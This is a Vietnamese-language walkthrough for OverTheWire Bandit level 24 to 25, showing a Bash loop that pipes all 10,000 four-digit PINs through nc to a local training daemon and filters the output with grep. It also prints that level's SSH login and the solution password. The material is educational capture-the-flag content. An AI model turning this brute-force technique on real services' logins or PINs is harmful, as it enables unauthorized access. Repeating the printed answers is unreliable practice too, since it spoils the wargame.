# Level 24 -> Level 25

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time.

Commands you may need to solve this level:
`nc`, `for` (Bash loop), `grep`

---

## 1. THÔNG TIN KẾT NỐI (DÙNG PASSWORD TÌM ĐƯỢC TỪ BANDIT 23)

- **Host**: `bandit.labs.overthewire.org`
- **Port**: `2220`
- **Username**: `bandit24`
- **Password**: `hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv`

---

## 2. CÂU LỆNH KẾT NỐI SSH VÀO BANDIT 24

Mở Terminal / PowerShell và chạy:

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

---

## 3. KIẾN THỨC MỚI & THỬ THÁCH CỦA LEVEL 24

- **Thử thách**: Trên cổng `30002` của `localhost` có một dịch vụ yêu cầu bạn nhập:
  `<mật_khẩu_bandit24> <mã_PIN_bí_mật_4_chữ_số>`
  Ví dụ: `hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 1234`
  Mã PIN gồm 4 chữ số (từ `0000` đến `9999` - tổng cộng đúng 10.000 trường hợp). Cách duy nhất để lấy mật khẩu là thử toàn bộ 10.000 mã này.

- **Khái niệm Tấn công vét cạn (Brute-force Attack)**:
  - Brute-force là phương pháp thử tất cả các khả năng có thể xảy ra cho đến khi tìm được đáp án đúng.
  - Con người nhập tay 10.000 lần sẽ mất nhiều ngày, nhưng máy tính có thể tạo và thử xong 10.000 mã chỉ trong khoảng 3 đến 5 giây!

- **Kỹ thuật sinh chuỗi số trong Bash `{0000..9999}`**:
  - Trong Bash, cú pháp `{0000..9999}` sẽ tự động sinh ra toàn bộ các số từ 0000, 0001, ..., 9999 có kèm số 0 ở đầu một cách chuẩn xác.

- **Tham số đảo ngược của `grep` (`grep -v`)**:
  - Vì có tới 9.999 lần đoán sai, dịch vụ sẽ in ra 9.999 dòng chữ `Wrong! Please enter the correct pincode...`.
  - Tham số `-v` (invert-match) giúp **loại bỏ tất cả các dòng chứa chữ "Wrong"**, chỉ giữ lại duy nhất dòng kết quả thành công!

---

## 4. CÁC BƯỚC THỰC HIỆN ĐỂ LẤY PASSWORD LEVEL 25

### Cách 1: Tạo danh sách từ điển (Wordlist) rồi gửi vào cổng (Khuyên dùng)
1. Tạo một thư mục tạm riêng cho bạn và đi vào đó:
   ```bash
   mkdir /tmp/mybf_24 && cd /tmp/mybf_24
   ```

2. Tạo file danh sách 10.000 dòng gồm mật khẩu kèm mã PIN:
   ```bash
   for pin in {0000..9999}; do echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $pin" >> wordlist.txt; done
   ```
   *(Lệnh này chạy chỉ mất 1-2 giây để tạo ra file `wordlist.txt` chứa 10.000 dòng).*

3. Bắn toàn bộ file `wordlist.txt` vào cổng 30002 và lọc bỏ các dòng báo sai:
   ```bash
   cat wordlist.txt | nc localhost 30002 | grep -v "Wrong"
   ```

---

### Cách 2: Lệnh một dòng (One-liner trực tiếp)
Nếu không muốn tạo file, bạn có thể truyền thẳng vòng lặp qua cổng 30002:
```bash
for pin in {0000..9999}; do echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $pin"; done | nc localhost 30002 | grep -v "Wrong"
```

*Kết quả*: Sau vài giây rà quét, màn hình sẽ in ra thông báo chúc mừng kèm theo mã PIN đúng và chuỗi mật khẩu chính thức của bandit25!

---

## 5. KẾT QUẢ / MẬT KHẨU LEVEL 25

```text
Password bandit25: [SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P]
```
